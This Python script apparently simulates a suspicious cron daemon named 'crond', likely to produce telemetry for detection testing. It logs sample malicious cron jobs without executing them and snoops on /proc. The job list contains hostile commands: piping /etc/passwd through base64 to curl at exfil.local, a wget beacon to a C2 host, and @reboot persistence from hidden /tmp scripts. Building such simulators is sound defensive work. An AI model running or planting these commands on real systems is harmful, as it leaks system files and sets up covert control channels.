from __future__ import annotations

import os
import pathlib
import subprocess
import time
import random
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

# Typo: crond vs cron
PROC = "crond"
CRON_OUT = pathlib.Path("/tmp/.cron.out")

FAKE_JOBS = [
    ("* * * * *",    "curl -s http://update-check.system.internal/ping"),
    ("*/5 * * * *",  "python3 /tmp/.update.py"),
    ("0 * * * *",    "bash -c 'cat /etc/passwd | base64 | curl -d @- http://exfil.local'"),
    ("@reboot",      "/bin/bash /tmp/.persist.sh"),
    ("*/15 * * * *", "wget -q -O /dev/null http://beacon.c2.local/hb"),
]


def read_cron_dirs() -> None:
    for path in ["/etc/cron.d", "/etc/cron.hourly", "/var/spool/cron/crontabs"]:
        try:
            entries = list(pathlib.Path(path).iterdir())
            log(PROC, f"Read {path}: {len(entries)} entries")
        except Exception:
            pass


def run_fake_job(schedule: str, cmd: str) -> None:
    log(PROC, f"Running job [{schedule}]: {cmd}")
    with CRON_OUT.open("a") as f:
        import datetime
        f.write(f"[{datetime.datetime.now().isoformat()}] [{schedule}] {cmd}\n")

    # Spawn as a child of crond to create suspicious parent-child relationship
    try:
        subprocess.Popen(
            ["bash", "-c", f"sleep {random.randint(1,5)} && echo 'job done'"],
            start_new_session=False,  # intentionally keep as child of crond
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except Exception:
        pass


def main() -> None:
    set_proc_name(PROC)
    read_cron_dirs()
    log(PROC, "crond starting — scheduling daemon")

    tick = 0
    while True:
        tick += 1
        # Run a random "job" every few ticks
        if tick % 3 == 0:
            schedule, cmd = random.choice(FAKE_JOBS)
            run_fake_job(schedule, cmd)

        # Also snoop on running processes like a real cron would
        try:
            for pid_dir in random.sample(list(pathlib.Path("/proc").iterdir()), 5):
                if pid_dir.name.isdigit():
                    (pid_dir / "cmdline").read_bytes()
        except Exception:
            pass

        time.sleep(jitter(60.0))


main()
